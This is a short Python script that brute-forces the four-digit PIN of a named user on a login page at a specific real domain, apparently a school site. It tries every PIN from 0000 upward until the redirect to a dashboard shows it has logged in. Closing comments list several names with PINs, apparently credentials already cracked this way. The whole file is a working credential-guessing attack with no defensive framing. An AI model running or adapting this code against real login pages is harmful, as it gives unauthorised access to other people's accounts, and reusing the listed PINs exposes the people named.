import requests
import time
x = 0
try:
    while x < 9999:
        formattedX = f"{x:04d}"

        print("Pokus: " + str(formattedX)) 
        
        session = requests.Session()
        response = session.post("https://spsrakovnik.tech/AT/index.php", data={"username": "opat", "pin": formattedX})

        
        if "dashboard.php" in response.url:
            print("✅ Logged in on: " + str(formattedX))
            x = 9999
            break  
        x += 1
        time.sleep(0.05)
finally: 
    print("Crashed at: " + str(x))



# HAUNER - 2367
# SUBRT - 1235
# ja - 2121